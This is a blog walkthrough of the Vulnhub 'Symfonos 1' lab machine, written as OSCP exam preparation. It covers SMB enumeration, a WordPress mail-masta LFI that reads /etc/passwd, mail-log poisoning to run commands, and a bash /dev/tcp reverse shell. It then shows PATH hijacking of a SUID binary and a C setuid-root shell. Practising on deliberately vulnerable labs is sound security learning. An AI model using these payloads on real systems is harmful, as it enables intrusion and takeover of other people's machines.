<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Vulnhub: Symfonos 1 :: ikuamike — CTFs :: InfoSec :: Hacking</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content=""/>
<meta name="keywords" content=", "/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://blog.ikuamike.io/posts/2021/symfonos1/" />


<link rel="stylesheet" href="https://blog.ikuamike.io/assets/style.css">

  <link rel="stylesheet" href="https://blog.ikuamike.io/assets/green.css">



<link rel="stylesheet" href="https://blog.ikuamike.io/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://blog.ikuamike.io/img/apple-touch-icon-144-precomposed.png">

<link rel="shortcut icon" href="https://blog.ikuamike.io/img/favicon/green.png">



<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Vulnhub: Symfonos 1 :: ikuamike — CTFs :: InfoSec :: Hacking" />
<meta name="twitter:description" content="" />
<meta name="twitter:site" content="https://blog.ikuamike.io/" />
<meta name="twitter:creator" content="" />
<meta name="twitter:image" content="">


<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Vulnhub: Symfonos 1 :: ikuamike — CTFs :: InfoSec :: Hacking">
<meta property="og:description" content="" />
<meta property="og:url" content="https://blog.ikuamike.io/posts/2021/symfonos1/" />
<meta property="og:site_name" content="Vulnhub: Symfonos 1" />
<meta property="og:image" content="">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta property="article:published_time" content="2021-01-22 00:00:00 &#43;0000 UTC" />











</head>
<body class="">


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    &gt; cd ~
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About Me</a></li>
        
      
        
          <li><a href="/webinars">Webinars</a></li>
        
      
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About Me</a></li>
      
    
      
        <li><a href="/webinars">Webinars</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://blog.ikuamike.io/posts/2021/symfonos1/">Vulnhub: Symfonos 1</a></h1>
  <div class="post-meta">
      
    <span class="post-date">
      2021-01-22
    </span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="https://blog.ikuamike.io/tags/oscp-prep/">OSCP Prep</a>&nbsp;
    
    #<a href="https://blog.ikuamike.io/tags/vulnhub/">Vulnhub</a>&nbsp;
    
  </span>
  

  

  <div class="post-content">
    <img src="/img/symfonos1/symfonos1.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>Machine link: <a href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a></p>
<h1 id="summary">Summary</h1>
<p>I got an OSCP voucher last year and this is my active effort to prep for it using TJ-Null&rsquo;s OSCP
Prep list. Hopefully documenting this will help improve my methodology and get me ready for OSCP and beyond.</p>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>I already have the IP of the box.</p>
<p>Nmap output:</p>
<pre><code>Nmap scan report for 192.168.191.128
Host is up (0.00025s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,
| ssl-cert: Subject: commonName=symfonos
| Subject Alternative Name: DNS:symfonos
| Not valid before: 2019-06-29T00:29:42
|_Not valid after:  2029-06-26T00:29:42
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2021-01-21T13:48:08-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-01-21T19:48:08
|_  start_date: N/A
</code></pre><h1 id="enumeration">Enumeration</h1>
<h2 id="samba-139445">Samba (139/445)</h2>
<p>Using enum4linux-ng we get 2 pieces of useful information.</p>
<pre><code>enum4linux-ng.py -A 192.168.191.128:

</code></pre><p>A user helios is discovered</p>

  <img src="/img/symfonos1/symfonos2.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>and the anonymous share is accessible without credentials.</p>

  <img src="/img/symfonos1/symfonos3.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>Using smbclient to access the share, there is a txt file.</p>
<pre><code>smbclient \\\\192.168.191.128\\anonymous -N
</code></pre>
  <img src="/img/symfonos1/symfonos4.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>Looking at the contents of attention.txt:</p>

  <img src="/img/symfonos1/symfonos5.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>Now we have a username and possible passwords. The combination <strong>helios:qwerty</strong> works and we can access
the helios share.</p>
<p>We get access to more txt files, but only the todo.txt has valuable information.</p>

  <img src="/img/symfonos1/symfonos6.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>It gives an endpoint,that we can access on the webserver.</p>

  <img src="/img/symfonos1/symfonos7.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<h2 id="http-80">HTTP (80)</h2>
<p>When we access the endpoint we end up on a wordpress instance.</p>

  <img src="/img/symfonos1/symfonos8.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>After enumeration using wpscan, 2 plugins are discovered to be vulnerable to unauthenticated LFI.</p>
<pre><code>wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token [redacted]
</code></pre><ol>
<li>mail-masta 1.0:</li>
</ol>

  <img src="/img/symfonos1/symfonos9.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<ol start="2">
<li>site-editor 1.1.1</li>
</ol>

  <img src="/img/symfonos1/symfonos10.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>Using the PoC available on exploitdb: <a href="https://www.exploit-db.com/exploits/40290/">https://www.exploit-db.com/exploits/40290/</a> , we can craft this url
to read files such as /etc/passwd:</p>
<pre><code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
</code></pre>
  <img src="/img/symfonos1/symfonos11.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<h1 id="lfi-to-rce">LFI to RCE</h1>
<p>A typical method to escalate to RCE using LFI is poisoning log files but I wasn&rsquo;t able to load any log
file to use this method.
With the presence of port 25 we can try sending an email and try accessing the email using LFI.</p>
<p>Sending email with payload:</p>

  <img src="/img/symfonos1/symfonos12.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>Visiting the mails for user helios in /var/mail/helios gives access to the poisoned file and we can run commands.</p>
<pre><code>http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=whoami
</code></pre>
  <img src="/img/symfonos1/symfonos13.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>Now we can get a reverse shell using this payload:</p>
<pre><code>/bin/bash -c &quot;/bin/bash -i &gt;%26 /dev/tcp/192.168.191.1/9000 0&gt;%261 %26&quot;
</code></pre><h1 id="privilege-escalation">Privilege Escalation</h1>
<p>A good starting point for privilege escalation is looking suid binaries by using this find command.</p>
<pre><code>find / -perm -4000 2&gt;/dev/null
</code></pre><p>The binary statuscheck isn&rsquo;t among the linux default ones.</p>

  <img src="/img/symfonos1/symfonos14.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>After running it and then running strings against it, it calls the curl command when executed.</p>

  <img src="/img/symfonos1/symfonos15.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<p>Since it doesn&rsquo;t use the absolute path we can abuse this by setting our own PATH and make it call our own custom
curl command.</p>
<p>In my custom curl script I get a copy of bash and give it suid permissions:</p>

  <img src="/img/symfonos1/symfonos16.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<h3 id="rooted">Rooted</h3>

  <img src="/img/symfonos1/symfonos17.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />


<h1 id="extras">Extras</h1>
<p>Better way to handle the sending email part using sendEmail:</p>
<pre><code>sendEmail -t root@symfonos.localdomain -f test@sendEmailtest.com -s 192.168.191.128:25 -u &quot;Test Subject&quot; -m &quot;Test Message&quot; -o tls=no
</code></pre><p>Better suid exploit, compiling a c program that correctly sets the uid and gid as root.</p>
<pre><code>#include&lt;unistd.h&gt;
void main(){
    setgid(0); 
    setuid(0);
    execl(&quot;/bin/bash&quot;,&quot;/bin/bash&quot;,0);
}
</code></pre><p>Reason why sending mails addressed to other users drops all the mails to helios is because of aliases set in postfix: /etc/postfix/main.cf</p>

  <img src="/img/symfonos1/symfonos18.png"  alt="symfonos1"  class="center"  style="border-radius: 8px;"  />
  </div>
  
  <div class="pagination">
    <div class="pagination__title">
      <span
        class="pagination__title-h">Read other posts</span>
      <hr />
    </div>
    <div class="pagination__buttons">
      
      
      <span class="button next">
        <a href="https://blog.ikuamike.io/posts/2020/metasploitctf2020/">
          <span class="button__text">Metasploit Community CTF December 2020 WriteUp</span>
          <span class="button__icon">→</span>
        </a>
      </span>
      
    </div>
  </div>
  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>© Michael Ikua</span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://blog.ikuamike.io/assets/main.js"></script>
<script src="https://blog.ikuamike.io/assets/prism.js"></script>





  
</div>

</body>
</html>
